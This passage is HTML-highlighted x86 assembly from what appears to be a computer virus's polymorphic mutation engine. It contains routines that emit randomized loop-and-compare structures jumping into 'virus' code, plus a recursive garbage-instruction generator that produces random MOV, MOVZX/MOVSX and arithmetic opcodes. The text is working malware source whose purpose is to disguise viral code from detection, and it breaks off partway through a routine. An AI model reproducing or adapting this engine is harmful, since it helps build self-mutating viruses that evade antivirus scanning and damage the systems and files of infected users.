                </span><span class="sc1">;Generate CMP counter_reg,end_value</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F881h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_value</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">doloopready</span><span class="sc0">

</span><span class="sc5">doloopauxreg</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Get a random valid register to use in a CMP instruction</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">

                </span><span class="sc1">;Move index reg value into aux reg</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;Guess what!?</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">;Generate CMP aux_reg,end_value</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F881h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_value</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                     
                </span><span class="sc1">;Restore aux reg state</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">

</span><span class="sc5">doloopready</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Generate conditional jump</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">doloopdown</span><span class="sc0">

</span><span class="sc5">doloopup</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Generate the following structure:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;       loop_point:</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       cmp reg,x</span><span class="sc0">
                </span><span class="sc1">;       jne loop_point</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       jmp virus</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loop_point</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

                </span><span class="sc1">;Insert a jump to virus code</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">mem_size</span><span class="sc4">-</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">doloopdown</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;...or may be this other structure:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;       loop_point:</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       cmp reg,x</span><span class="sc0">
                </span><span class="sc1">;       je virus</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       jmp loop_point</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">840Fh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">mem_size</span><span class="sc4">-</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

                </span><span class="sc1">;Insert a jump to loop point</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loop_point</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate some garbage code</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_garbage</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;More recursive levels allowed?</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">exit_gg</span><span class="sc0">

                </span><span class="sc1">;Choose garbage generator</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">loop_garbage</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_garbage</span><span class="sc4">-</span><span class="sc5">tbl_garbage</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_garbage</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_garbage</span><span class="sc0">

                </span><span class="sc1">;Update recursive level</span><span class="sc0">

</span><span class="sc5">exit_gg</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate MOV reg,imm</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_movreg32imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Generate MOV reg32,imm</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movreg16imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Generate MOV reg16,imm</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0B866h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movreg8imm</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Generate MOV reg8,imm</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movreg8imm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0004h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_movreg8imm</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate mov reg,reg</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">a_movregreg32</span><span class="sc0">
</span><span class="sc5">c_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movregreg16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">a_movregreg32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">c_movregreg32</span><span class="sc0">

</span><span class="sc5">g_movregreg8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movregreg8</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movregreg8</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">a_movregreg8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Ah</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2400h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_movregreg8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate MOVZX/MOVSX reg32,reg16</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_movzx_movsx</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">d_movzx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">
</span><span class="sc5">d_movzx</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate ADD/SUB/XOR/OR/AND reg,imm</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">g_mathregimm32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_math_work</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_mathregimm16</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8166h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_math_work</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_mathregimm8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_math8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
